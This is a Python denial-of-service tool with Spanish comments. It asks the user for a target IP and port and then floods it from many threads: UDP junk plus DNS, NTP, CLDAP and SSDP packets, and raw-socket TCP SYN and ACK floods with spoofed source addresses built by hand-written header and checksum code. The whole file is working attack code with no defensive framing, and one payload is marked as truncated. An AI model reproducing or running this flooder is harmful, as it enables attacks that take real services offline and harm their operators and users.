import threading
import socket
import random
import time
import sys
import struct

# --- Solicitar IP y puerto al usuario ---
target = input("Introduce la IP objetivo: ")
port = int(input("Introduce el puerto objetivo: "))

udp_port = port
tcp_port = port

# --- UDP FLOOD CON PAYLOAD PERSONALIZADO ---
def udp_flood():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'ZxC-UDP-ATTACK' + random._urandom(1010)
    while True:
        try:
            s.sendto(payload, (target, udp_port))
        except:
            pass

# --- UDP DNS FLOOD ---
def udp_dns_flood():
    dns_port = udp_port
    dns_payload = b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06google\x03com\x00\x00\x01\x00\x01'
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(dns_payload, (target, dns_port))
        except:
            pass

# --- UDP NTP FLOOD ---
def udp_ntp_flood():
    ntp_port = udp_port
    ntp_payload = b'\x1b' + 47 * b'\0'
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(ntp_payload, (target, ntp_port))
        except:
            pass

# --- UDP CLDAP FLOOD ---
def udp_cldap_flood():
    cldap_port = udp_port
    cldap_payload = b'\x30\x84\x00\x00\x00\x35\x02\x01\x01\x63\x84\x00\x00\x00\x28\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73'  # Truncated for brevity
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(cldap_payload, (target, cldap_port))
        except:
            pass

# --- UDP SSDP FLOOD ---
def udp_ssdp_flood():
    ssdp_port = udp_port
    ssdp_payload = (
        b'M-SEARCH * HTTP/1.1\r\n'
        b'HOST:239.255.255.250:1900\r\n'
        b'ST: ssdp:all\r\n'
        b'MAN: "ssdp:discover"\r\n'
        b'MX: 3\r\n\r\n'
    )
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        try:
            s.sendto(ssdp_payload, (target, ssdp_port))
        except:
            pass

# --- TCP SYN FLOOD (requiere root/admin) ---
def tcp_syn_flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except PermissionError:
        print("Necesitas ejecutar como root/administrador para SYN flood.")
        sys.exit(1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    while True:
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        tcp_syn_packet = build_tcp_packet(src_ip, target, random.randint(1024, 65535), tcp_port, syn=1)
        try:
            s.sendto(tcp_syn_packet, (target, 0))
        except:
            pass

# --- TCP ACK FLOOD (requiere root/admin) ---
def tcp_ack_flood():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except PermissionError:
        print("Necesitas ejecutar como root/administrador para ACK flood.")
        sys.exit(1)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    while True:
        src_ip = ".".join(map(str, (random.randint(1, 254) for _ in range(4))))
        tcp_ack_packet = build_tcp_packet(src_ip, target, random.randint(1024, 65535), tcp_port, ack=1)
        try:
            s.sendto(tcp_ack_packet, (target, 0))
        except:
            pass

# --- Construcción básica de TCP/IP (para SYN/ACK flood) ---
def checksum(msg):
    s = 0
    for i in range(0, len(msg)-1, 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w
    if len(msg) % 2:
        s += (msg[-1] << 8)
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    return ~s & 0xffff

def build_tcp_packet(src_ip, dst_ip, src_port, dst_port, syn=0, ack=0):
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 40
    ip_id = random.randint(0, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    tcp_seq = random.randint(0,4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_flags = (syn << 1) + (ack << 4)
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, tcp_seq, tcp_ack_seq, tcp_doff << 4, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
    src_addr = socket.inet_aton(src_ip)
    dest_addr = socket.inet_aton(dst_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    psh = struct.pack('!4s4sBBH', src_addr, dest_addr, placeholder, protocol, tcp_length)
    psh = psh + tcp_header
    tcp_check = checksum(psh)
    tcp_header = struct.pack('!HHLLBBH', src_port, dst_port, tcp_seq, tcp_ack_seq, tcp_doff << 4, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
    packet = ip_header + tcp_header
    return packet

# --- Lanzar todos los métodos ---
if __name__ == "__main__":
    threads = []
    for func in [
        udp_flood,
        udp_dns_flood,
        udp_ntp_flood,
        udp_cldap_flood,
        udp_ssdp_flood,
        tcp_syn_flood,
        tcp_ack_flood
    ]:
        for _ in range(10):
            t = threading.Thread(target=func)
            t.daemon = True
            t.start()
            threads.append(t)
    while True:
        time.sleep(10)
